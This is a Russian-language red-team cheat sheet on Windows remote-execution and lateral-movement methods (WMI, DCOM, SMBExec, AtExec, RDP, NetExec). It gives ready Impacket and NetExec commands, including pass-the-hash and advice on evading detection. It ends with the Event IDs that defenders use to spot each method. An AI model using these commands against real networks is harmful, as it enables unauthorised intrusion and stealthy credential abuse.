# ДРУГИЕ МЕТОДЫ УДАЛЕННОГО ВЫПОЛНЕНИЯ

PsExec и WinRM — основные методы, но есть и другие. Каждый использует разные протоколы и имеет свои особенности.


# WMI (wmiexec.py)

**Как работает:** Использует DCOM и Win32_Process.Create для запуска процессов

**Уровень шума:** Низкий (нет установки служб, нет записи на диск)

**Когда использовать:** Когда PsExec заблокирован или детектится

**Пример:**
wmiexec.py DOMAIN/user:pass@TARGET_IP
wmiexec.py DOMAIN/user@TARGET_IP -hashes :NTLM_HASH


# DCOM (dcomexec.py)

**Как работает:** Использует легитимные COM объекты (MMC20.Application, ShellWindows)

**Уровень шума:** Низкий (использует легитимные пути автоматизации COM)

**Когда использовать:** Когда Service Control Manager заблокирован, но DCOM доступен

**Пример:**
dcomexec.py DOMAIN/user:pass@TARGET_IP


# SMBExec (smbexec.py)

**Как работает:** Создает службу, которая запускает cmd.exe /c и пишет вывод во временный файл

**Уровень шума:** Средний (генерирует Event ID 7045, но не оставляет бинарник на диске)

**Когда использовать:** Когда антивирус ловит загрузку бинарника PsExec

**Пример:**
smbexec.py DOMAIN/user:pass@TARGET_IP

# AtExec (atexec.py)

**Как работает:** Создает одноразовую задачу через Task Scheduler RPC

**Уровень шума:** Средний (генерирует Event ID 4698 — создание задачи)

**Когда использовать:** Когда SCM и DCOM заблокированы

**Пример:**
atexec.py DOMAIN/user:pass@TARGET_IP whoami


# RDP (xfreerdp / rdesktop)

**Как работает:** Полноценная графическая сессия удаленного рабочего стола

**Уровень шума:** Высокий (интерактивный вход — Event ID 4624 Type 10)

**Когда использовать:** Когда нужен GUI доступ к приложению

**Пример:**
xfreerdp /v:TARGET_IP /u:username /p:password


# NetExec (nxc) для быстрых команд

**Как работает:** Однострочное выполнение команд через SMB

**Когда использовать:** Когда нужна быстрая команда без полноценной интерактивной сессии

**Выполнить cmd команду (маленькая -x):**
nxc smb TARGET_IP -u user -p pass -d DOMAIN -x 'whoami /all'

**Выполнить PowerShell команду (большая -X):**
nxc smb TARGET_IP -u user -p pass -d DOMAIN -X '$PSVersionTable'


# ОБЩАЯ ОСОБЕННОСТЬ

Все Impacket скрипты принимают одни и те же параметры аутентификации:
- Plaintext пароль
- NTLM хэш (`-hashes :NTLM_HASH`)
- Kerberos билеты (`-k`)


# ДЕТЕКЦИЯ — КАКИЕ EVENT ID ОСТАВЛЯЕТ КАЖДЫЙ МЕТОД

**Event ID 4624 (Type 3)** — Network logon
- Генерируется при любом SMB/WinRM/WMI подключении

**Event ID 4648** — Logon using explicit credentials
- Когда передаются учетные данные напрямую

**Event ID 7045** — Новая служба установлена
- Сигнатура PsExec и SMBExec

**Event ID 4697** — Service installed (новый эквивалент 7045)

**Event ID 4698** — Scheduled task created
- Сигнатура AtExec

**Event ID 4688** — Process creation
- Требует включенного аудита командной строки

## Самый надежный индикатор PsExec

Event ID 7045 + короткое рандомное имя службы (3-4 символа). Легитимные сервисы редко имеют такие имена.

# БЫСТРАЯ ШПАРГАЛКА

# WMI
wmiexec.py DOMAIN/user:pass@IP
wmiexec.py DOMAIN/user@IP -hashes :NTLM_HASH

# DCOM
dcomexec.py DOMAIN/user:pass@IP

# SMBExec
smbexec.py DOMAIN/user:pass@IP

# AtExec (одноразовая команда)
atexec.py DOMAIN/user:pass@IP "whoami"

# RDP
xfreerdp /v:IP /u:user /p:pass

# Быстрая команда через NetExec
nxc smb IP -u user -p pass -d DOMAIN -x 'whoami'
nxc smb IP -u user -p pass -d DOMAIN -X '$PSVersionTable'